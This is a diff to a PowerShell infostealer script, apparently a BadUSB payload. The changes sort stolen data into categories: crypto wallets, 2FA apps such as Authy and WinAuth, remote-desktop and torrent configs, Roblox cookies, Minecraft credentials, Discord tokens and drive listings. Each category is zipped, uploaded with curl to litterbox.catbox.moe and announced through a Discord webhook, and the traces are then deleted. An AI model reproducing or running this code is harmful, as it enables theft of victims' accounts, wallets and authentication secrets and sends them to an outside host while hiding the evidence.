@@ -73,7 +73,7 @@ if ($pers -ne 'True') {
 	$text+=" Persistence is **not enabled**!"
 	}
 }
-$test += " Good luck and happy looting! :pirate_flag:"
+$text += " Good luck and happy looting! :pirate_flag:"
 
 $Body = @{
   'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
@@ -91,109 +91,351 @@ if ($obs -ne $null) {
 	Get-Content -Path $obs >> $env:tmp/$FolderName/OBS/service.json
 }
 
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/FTPandFileSync" -ItemType Directory
+
 # FileZilla
 $filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($filezilla -ne $null) {
-	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName" -Recurse
+	Copy-Item "$env:appdata/FTPandFileSync/FileZilla" "$env:tmp/$FolderName" -Recurse
 }
 
 # SyncThing
 if ([System.IO.File]::Exists("$env:appdata/../Syncthing/syncthing.log")) {
-	New-Item -Path $env:tmp/$FolderName/Syncthing -ItemType Directory
-	Copy-Item "$env:appdata/../Syncthing/" "$env:tmp/$FolderName/" -Recurse
+	New-Item -Path $env:tmp/$FolderName/FTPandFileSync/Syncthing -ItemType Directory
+	Copy-Item "$env:appdata/../Syncthing/" "$env:tmp/$FolderName/FTPandFileSync/Syncthing" -Recurse
 }
+
+Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"
+
+$text = "**FTPandFileSync**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\FTPandFileSync" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/RemoteControl" -ItemType Directory
 
 # RustDesk
 if ([System.IO.File]::Exists("$env:appdata\RuskDesk\config")) {
-	New-Item -Path $env:tmp/$FolderName/RustDesk -ItemType Directory
-	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RustDesk/config" -Recurse
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/RustDesk -ItemType Directory
+	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
 }
 
 # TeamViewer
 if ([System.IO.File]::Exists("$env:appdata\..\TeamViewer\Logs")) {
-	New-Item -Path $env:tmp/$FolderName/TeamViewer -ItemType Directory
-	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/TeamViewer/Logs" -Recurse
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
+	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
 }
 
 # AnyDesk
 if ([System.IO.File]::Exists("$env:appdata\AnyDesk\connection_trace.txt")) {
-	New-Item -Path $env:tmp/$FolderName/AnyDesk -ItemType Directory
-	Copy-Item "$env:appdata/AnyDesk/connection_trace.txt" "$env:tmp/$FolderName/AnyDesk/connection_trace.txt"
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/AnyDesk -ItemType Directory
+	Copy-Item "$env:appdata/AnyDesk/connection_trace.txt" "$env:tmp/$FolderName/RemoteControl/AnyDesk/connection_trace.txt"
 }
+
+# Parsec
+if ([System.IO.File]::Exists("$env:appdata/Parsec/log.txt")) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
+	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"
+
+$text = "**RemoteControl**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/RemoteControl-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\RemoteControl" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders" -ItemType Directory
 
 # JDownloader
 $jdl = Get-Childitem -Path "$env:appdata\..\Local\JDownloader 2.0\" -Include Core.jar -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($jdl -ne $null) {
-	New-Item -Path "$env:tmp/$FolderName/JDownloader2.0" -ItemType Directory
-	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/JDownloader2.0/logs" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/JDownloader2.0" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/TorrentsAndDownloaders/JDownloader2.0" -Recurse
 }
 
 # qBittorrent
 $qbt = Get-Childitem -Path "$env:appdata\..\Local\qBittorrent\logs" -Include qbittorrent.log -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($qbt -ne $null) {
-	New-Item -Path "$env:tmp/$FolderName/qBittorrent" -ItemType Directory
-	Copy-Item "$env:appdata\qBittorrent\qBittorrent.ini" "$env:tmp/$FolderName/qBittorrent/qBittorrent.ini"
-	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/qBittorrent/logs" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent" -ItemType Directory
+	Copy-Item "$env:appdata\qBittorrent\qBittorrent.ini" "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent/qBittorrent.ini"
+	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent/logs" -Recurse
 }
 
 # Vuze
 $vuze = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($vuze -ne $null) {
-	New-Item -Path "$env:tmp/$FolderName/Vuze" -ItemType Directory
-	Copy-Item "$env:appdata\Azureus\downloads.config" "$env:tmp/$FolderName/Vuze/downloads.config"
-	Copy-Item "$env:appdata\Azureus\dlhistoryd.config" "$env:tmp/$FolderName/Vuze/dlhistoryd.config"
-	Copy-Item "$env:appdata\Azureus\dlhistorya.config" "$env:tmp/$FolderName/Vuze/dlhistorya.config"
-	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/Vuze/azureus.config"
+	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze" -ItemType Directory
+	Copy-Item "$env:appdata\Azureus\downloads.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/downloads.config"
+	Copy-Item "$env:appdata\Azureus\dlhistoryd.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/dlhistoryd.config"
+	Copy-Item "$env:appdata\Azureus\dlhistorya.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/dlhistorya.config"
+	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/azureus.config"
 }
 
 # uTorrent
 $utorrent = Get-Childitem -Path "$env:appdata\utorrent" -Include settings.dat -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($utorrent -ne $null) {
-	New-Item -Path "$env:tmp/$FolderName/uTorrent" -ItemType Directory
-	Copy-Item "$env:appdata\utorrent\settings.dat" "$env:tmp/$FolderName/uTorrent/settings.dat"
+	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/uTorrent" -ItemType Directory
+	Copy-Item "$env:appdata\utorrent\settings.dat" "$env:tmp/$FolderName/TorrentsAndDownloaders/uTorrent/settings.dat"
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/TorrentsAndDownloaders -DestinationPath "$env:tmp/TorrentsAndDownloaders-$ZIP"
+
+$text = "**TorrentsAndDownloaders**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/TorrentsAndDownloaders-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\TorrentsAndDownloaders" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\TorrentsAndDownloaders-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/Crypto" -ItemType Directory
+
+# Bitcoin
+$path="$env:appdata/Bitcoin/wallets"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Bitcoin" -ItemType Directory
+	Copy-Item "$env:appdata/Bitcoin/wallets" "$env:tmp/$FolderName/Crypto/Bitcoin" -Recurse
+}
+
+# Electrum
+$path="$env:appdata/Electrum/wallets"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Electrum" -ItemType Directory
+	Copy-Item "$env:appdata/Electrum/wallets" "$env:tmp/$FolderName/Crypto/Electrum" -Recurse
+}
+
+# Sparrow
+$path="$env:appdata/Sparrow/wallets"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Sparrow" -ItemType Directory
+	Copy-Item "$env:appdata/Sparrow/wallets" "$env:tmp/$FolderName/Crypto/Sparrow" -Recurse
+}
+
+# Bither
+$path="$env:appdata/Bither/wallet"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Bither" -ItemType Directory
+	Copy-Item "$env:appdata/Bither/wallet" "$env:tmp/$FolderName/Crypto/Bither" -Recurse
+}
+
+# Frame
+$path="$env:appdata/frame"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/frame" -ItemType Directory
+	Copy-Item "$env:appdata/frame/config.json" "$env:tmp/$FolderName/Crypto/frame/config.json"
+}
+
+# MyCrypto
+$path="$env:appdata/MyCrypto"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/MyCrypto" -ItemType Directory
+	Copy-Item "$env:appdata/MyCrypto" "$env:tmp/$FolderName/Crypto/MyCrypto" -Recurse
+}
+
+# Exodus
+$path="$env:appdata/Exodus"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Exodus" -ItemType Directory
+	Copy-Item "$env:appdata/Exodus" "$env:tmp/$FolderName/Crypto/Exodus" -Recurse
+}
+
+# Spectre
+$path="$env:appdata/spectre-desktop"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Spectre" -ItemType Directory
+	Copy-Item "$env:appdata/spectre-desktop" "$env:tmp/$FolderName/Crypto/Spectre" -Recurse
+}
+
+# OneKey
+$path="$env:appdata/@onekey/desktop"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/OneKey" -ItemType Directory
+	Copy-Item "$env:appdata/@onekey/desktop" "$env:tmp/$FolderName/Crypto/OneKey" -Recurse
+}
+
+# InfinityWallet
+$path="$env:appdata/InfinityWallet"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/InfinityWallet" -ItemType Directory
+	Copy-Item "$env:appdata/InfinityWallet" "$env:tmp/$FolderName/Crypto/InfinityWallet" -Recurse
+}
+
+# InfinityWallet
+$path="$env:appdata/Guarda"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Guarda" -ItemType Directory
+	Copy-Item "$env:appdata/Guarda" "$env:tmp/$FolderName/Crypto/Guarda" -Recurse
+}
+
+# CoinWallet
+$path="$env:appdata/Coin Wallet"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/CoinWallet" -ItemType Directory
+	Copy-Item "$env:appdata/Coin Wallet" "$env:tmp/$FolderName/Crypto/CoinWallet" -Recurse
+}
+
+# WalletWasabi
+$path="$env:appdata/WalletWasabi/Client/Wallets"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/WalletWasabi" -ItemType Directory
+	Copy-Item "$env:appdata/WalletWasabi/Client/Wallets" "$env:tmp/$FolderName/Crypto/WalletWasabi" -Recurse
+}
+
+# Armory
+$path="$env:appdata/Armory"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Armory" -ItemType Directory
+	Copy-Item "$env:appdata/Armory" "$env:tmp/$FolderName/Crypto/Armory" -Recurse
 }
 
 # Monero
 $path=[Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets"
 if (Test-Path $path -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Monero" -ItemType Directory
-	Copy-Item [Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets" "$env:tmp/$FolderName/Monero/wallets" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Monero" -ItemType Directory
+	Copy-Item [Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets" "$env:tmp/$FolderName/Crypto/Monero" -Recurse
 }
+
+Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"
+
+$text = "**Crypto**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Crypto-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Crypto" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Crypto-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/2FA" -ItemType Directory
 
 # Authy Desktop
 $path="$env:appdata\Authy Desktop"
 if (Test-Path $path -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Authy" -ItemType Directory
-	Copy-Item "$documents\Authy Desktop\Cookies" "$env:tmp/$FolderName/Authy/Cookies"
-	Copy-Item "$documents\Authy Desktop\Local State" "$env:tmp/$FolderName/Authy/Local State"
-	Copy-Item "$documents\Authy Desktop\Preferences" "$env:tmp/$FolderName/Authy/Preferences"
-	Copy-Item "$documents\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/Authy/Local Storage/leveldb" -Recurse
-	Copy-Item "$documents\Authy Desktop\Session Storage" "$env:tmp/$FolderName/Authy/Session Storage" -Recurse
-	Copy-Item "$documents\Authy Desktop\databases" "$env:tmp/$FolderName/Authy/databases" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/2FA/Authy" -ItemType Directory
+	Copy-Item "$documents\Authy Desktop\Cookies" "$env:tmp/$FolderName/2FA/Authy/Cookies"
+	Copy-Item "$documents\Authy Desktop\Local State" "$env:tmp/$FolderName/2FA/Authy/Local State"
+	Copy-Item "$documents\Authy Desktop\Preferences" "$env:tmp/$FolderName/2FA/Authy/Preferences"
+	Copy-Item "$documents\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/2FA/Authy/Local Storage/leveldb" -Recurse
+	Copy-Item "$documents\Authy Desktop\Session Storage" "$env:tmp/$FolderName/2FA/Authy/Session Storage" -Recurse
+	Copy-Item "$documents\Authy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
 }
 
-# BattleNet
-if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
-	New-Item -Path $env:tmp/$FolderName/BattleNet -ItemType Directory
-	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/BattleNet/Battle.net.config"
+# WinAuth
+$path="$env:appdata\WinAuth"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/2FA/WinAuth" -ItemType Directory
+	Copy-Item "$documents\WinAuth" "$env:tmp/$FolderName/2FA/WinAuth" -Recurse
 }
+
+# RoboForm
+$path="$env:appdata\..\Local\RoboForm\Profiles"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/2FA/RoboForm" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\RoboForm\Profiles" "$env:tmp/$FolderName/2FA/RoboForm" -Recurse
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/2FA -DestinationPath "$env:tmp/2FA-$ZIP"
+
+$text = "**2FA**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/2FA-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\2FA" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\2FA-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/Socials" -ItemType Directory
 
 # Telegram
 if ([System.IO.File]::Exists("$env:appdata/Telegram Desktop/log.txt")) {
-	New-Item -Path $env:tmp/$FolderName/Telegram -ItemType Directory
-	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Telegram\log.txt"
-}
-
-# Parsec
-if ([System.IO.File]::Exists("$env:appdata/Parsec/log.txt")) {
-	New-Item -Path $env:tmp/$FolderName/Parsec -ItemType Directory
-	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/Parsec/log.txt"
+	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
+	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Socials\Telegram\log.txt"
 }
 
 # Keybase
 if ([System.IO.File]::Exists("$env:appdata/../Local/Keybase/config.json")) {
-	New-Item -Path $env:tmp/$FolderName/Keybase -ItemType Directory
-	Copy-Item "$env:appdata/Keybase/config.json" "$env:tmp/$FolderName/Keybase/config.json"
+	New-Item -Path $env:tmp/$FolderName/Socials/Keybase -ItemType Directory
+	Copy-Item "$env:appdata/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
+
+$text = "**Socials**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Socials" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Socials-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/Gaming" -ItemType Directory
+
+# BattleNet
+if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
+	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/Gaming/BattleNet/Battle.net.config"
 }
 
 # Roblox
@@ -216,46 +458,46 @@ function get-RobloxCookies {
 
 $roblox = get-RobloxCookies
 if ($roblox -ne $null) {
-	$roblox >> $env:tmp/$FolderName/RobloxCookies.txt
+	$roblox >> $env:tmp/$FolderName/Gaming/RobloxCookies.txt
 }
 
 # Fortnite
 if (Test-Path "$env:appdata/../Local/FortniteGame" -PathType Any) {
-	New-Item -Path $env:tmp/$FolderName/Fortnite -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/Gaming/Fortnite -ItemType Directory
 }
 if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log")) {
-	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log" "$env:tmp/$FolderName/Fortnite/FortniteGame.log"
+	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log" "$env:tmp/$FolderName/Gaming/Fortnite/FortniteGame.log"
 }
 if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log")) {
-	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log" "$env:tmp/$FolderName/Fortnite/FortniteLauncher.log"
+	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log" "$env:tmp/$FolderName/Gaming/Fortnite/FortniteLauncher.log"
 }
 
 # RiotGames - Folders
 if (Test-Path "$env:appdata/../Local/Riot Games" -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Riot Games" -ItemType Directory
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games" -ItemType Directory
 }
 if (Test-Path "$env:appdata/../Local/VALORANT" -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Riot Games/Valorant" -ItemType Directory
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -ItemType Directory
 }
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client" -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Riot Games/Riot Client" -ItemType Directory
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -ItemType Directory
 }
 # VALORANT
 if (Test-Path "$env:appdata/../Local/Riot Games/VALORANT" -PathType Any) {
-	New-Item -Path "$env:tmp/$FolderName/Riot Games/Valorant" -ItemType Directory
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -ItemType Directory
 }
 if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Logs" -PathType Any) {
-Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Riot Games/Valorant" -Recurse
+Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
 }
 if (Test-Path "$env:appdata/../VALORANT/Saved/Config" -PathType Any) {
-Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Riot Games/Valorant" -Recurse
+Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
 }
 # RiotClient
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Data" -PathType Any) {
-Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Riot Games/Riot Client" -Recurse
+Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
 }
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Config" -PathType Any) {
-	Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Riot Games/Riot Client" -Recurse
+	Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
 }
 
 # Minecraft
@@ -275,13 +517,30 @@ function get-MinecraftAccounts {
 
 $minecraft = get-MinecraftAccounts
 if ($minecraft -ne $null) {
-	New-Item -Path $env:tmp/$FolderName/Minecraft -ItemType Directory
-	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json" > $env:tmp/$FolderName/Minecraft/launcher_accounts.json
-	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts_microsoft_store.json" > $env:tmp/$FolderName/Minecraft/launcher_accounts_microsoft_store.json
-	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials.bin" > $env:tmp/$FolderName/Minecraft/launcher_msa_credentials.bin
-	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials_microsoft_store.bin" > $env:tmp/$FolderName/Minecraft/launcher_msa_credentials_microsoft_store.bin
-	Get-Content -Path "$env:appdata/.minecraft/servers.dat" > $env:tmp/$FolderName/Minecraft/servers.dat
+	New-Item -Path $env:tmp/$FolderName/Gaming/Minecraft -ItemType Directory
+	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_accounts.json
+	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts_microsoft_store.json" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_accounts_microsoft_store.json
+	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials.bin" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_msa_credentials.bin
+	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials_microsoft_store.bin" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_msa_credentials_microsoft_store.bin
+	Get-Content -Path "$env:appdata/.minecraft/servers.dat" > $env:tmp/$FolderName/Gaming/Minecraft/servers.dat
 }
+
+Compress-Archive -Path $env:tmp/$FolderName/Gaming -DestinationPath "$env:tmp/Gaming-$ZIP"
+
+$text = "**Gaming**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Gaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Gaming" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Gaming-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
@@ -292,6 +551,23 @@ foreach($Drive in $drives) {
     tree $Drive /a /f >> $env:TEMP\$folderName\Trees\tree-$DriveName.txt
 }
 tree $env:appdata /a /f >> $env:TEMP\$folderName\Trees\tree-appdata.txt
+
+Compress-Archive -Path $env:tmp/$FolderName/Trees -DestinationPath "$env:tmp/Trees-$ZIP"
+
+$text = "**Trees**: Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Trees-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Trees" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Trees-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 # Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
@@ -1013,6 +1289,47 @@ taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 Start-Sleep 1
 $Browser="Opera"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Login Data"
+$preferences = "$path\Preferences"
+$leveldb = "$path\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $lvdb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
